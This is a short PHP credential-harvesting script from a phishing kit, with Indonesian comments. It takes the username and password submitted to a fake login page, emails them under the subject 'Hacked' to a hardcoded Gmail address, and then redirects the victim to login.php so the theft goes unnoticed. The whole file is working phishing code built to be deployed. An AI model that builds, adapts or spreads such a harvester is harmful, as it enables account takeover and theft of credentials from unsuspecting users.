<?php

$subjek = 'Hacked';
$mailto = 'ronaldhack18@gmail.com'; //masukin email lo disini

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['username'];
$paswot = $_POST['password'];
$ling = $_POST['link'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>
Hacked
Username : <font color="red">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>
Link : <font color="red">$ling</font> <br>
EOD;


$headers = "From: Aw\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek." #".rand(1000,10000), $body, $headers);
// $successsadap = mail($mailsadap, $subjeksadap." #".rand(1000,10000), $body, $headers);
?>
<?php
$random = rand(1000,5000);
?>
<script LANGUAGE="JavaScript">
<!--
window.location="login.php";
// -->
</script>